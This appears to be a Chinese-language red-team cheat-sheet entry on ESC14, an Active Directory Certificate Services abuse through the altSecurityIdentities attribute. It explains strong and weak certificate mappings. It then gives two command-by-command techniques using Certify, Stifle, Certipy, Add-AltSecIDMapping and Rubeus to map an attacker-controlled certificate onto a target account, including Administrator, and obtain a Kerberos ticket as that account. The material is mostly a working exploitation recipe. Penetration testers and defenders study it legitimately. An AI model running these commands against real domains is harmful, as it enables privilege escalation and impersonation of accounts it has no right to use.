# Active Directory - 证书 ESC14

## ESC14 - altSecurityIdentities

> ESC14 是一种 Active Directory 证书服务（ADCS）滥用技术，利用 altSecurityIdentities 属性执行显式证书映射。该属性允许管理员将特定证书与用户或计算机帐户关联以进行身份验证。然而，如果攻击者获得了对该属性的写入权限，他们可以将映射添加到自己控制的证书上，从而有效地冒充目标帐户。

域管理员可以通过配置用户对象的 altSecurityIdentities 属性，手动将证书与 Active Directory 中的用户关联。该属性支持六种不同的值，分为三种弱（不安全）映射和三种强映射。

一般来说，依赖唯一且不可重用标识符的映射被视为强映射。相反，基于用户名或电子邮件地址的映射被归类为弱映射，因为这些标识符可以轻松重用或更改。

| 映射方式 | 示例 | 类型 | 备注 |
| ---------------------- | ---------------------------------- | ------ | ------------- |
| X509IssuerSubject      | `X509:<I>IssuerName<S>SubjectName` | 弱 | / |
| X509SubjectOnly        | `X509:<S>SubjectName`              | 弱 | / |
| X509RFC822             | `X509:<RFC822>user@contoso.com`    | 弱 | 电子邮件地址 |
| X509IssuerSerialNumber | `X509:<I>IssuerName<SR>1234567890` | 强 | 推荐方式 |
| X509SKI                | `X509:<SKI>123456789abcdef`        | 强 | / |
| X509SHA1PublicKey       | `X509:<SHA1-PUKEY>123456789abcdef` | 强 | / |

**前提条件**：

* 能够修改某个帐户的 `altSecurityIdentitites` 属性。

**利用方法**：

**技术 1**：使用 [GhostPack/Certify](https://github.com/GhostPack/Certify) 和 [logangoins/Stifle](https://github.com/logangoins/Stifle)

```ps1
# 请求的证书必须是机器帐户证书
Certify.exe request /ca:lab.lan\lab-dc01-ca /template:Machine /machine

# 转换为 base64 .pfx 格式：
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export | base64 -w 0

# 生成证书映射字符串并写入目标对象的 altSecurityIdentities 属性：
Stifle.exe add /object:target /certificate:MIIMrQI... /password:P@ssw0rd

# 使用 PKINIT 身份验证通过 Rubeus 请求 TGT，有效地冒充目标用户：
Rubeus.exe asktgt /user:target /certificate:MIIMrQI... /password:P@ssw0rd
```

**技术 2**：使用 [Deloitte-OffSecResearch/Certipy](https://github.com/Deloitte-OffSecResearch/Certipy) 和 [JonasBK/Add-AltSecIDMapping.ps1](https://github.com/JonasBK/Powershell/blob/master/Add-AltSecIDMapping.ps1)

```ps1
# 请求机器帐户证书
addcomputer.py -method LDAPS -computer-name 'ESC13$' -computer-pass 'P@ssw0rd' -dc-host dc.lab.local 'lab.local/kuma'
certipy req -target dc.lab.local -dc-ip 10.10.10.10 -u "ESC13$@lab.local" -p 'P@ssw0rd' -template Machine -ca LAB-CA

# 提取序列号和颁发者以配置强映射
certutil -Dump -v .\esc13.pfx
Get-X509IssuerSerialNumberFormat -SerialNumber "<serial-number>" -IssuerDistinguishedName "<issuer-cn>"

# 向 Administrator 用户添加映射
Add-AltSecIDMapping -DistinguishedName "CN=Administrator,CN=Users,DC=lab,DC=local" -MappingString "<output-x509-issuer-serial-number>"

# 为 Administrator 请求 TGT
Rubeus.exe asktgt /user:Administrator /certificate:esc13.pfx /domain:lab.local /dc:dc.lab.local /show /nowrap
```

## 参考资料

* [ADCS ESC14 Abuse Technique - Jonas Bülow Knudsen - February 28, 2024](https://posts.specterops.io/adcs-esc14-abuse-technique-333a004dc2b9)
* [Exploitation de l'AD CS : ESC12, ESC13 et ESC14 - Guillon Bony Rémi - February, 2025](https://connect.ed-diamond.com/misc/mischs-031/exploitation-de-l-ad-cs-esc12-esc13-et-esc14)
* [GOAD - part 14 - ADCS 5/7/9/10/11/13/14/15 - Mayfly - March 10, 2025](https://mayfly277.github.io/posts/ADCS-part14/)
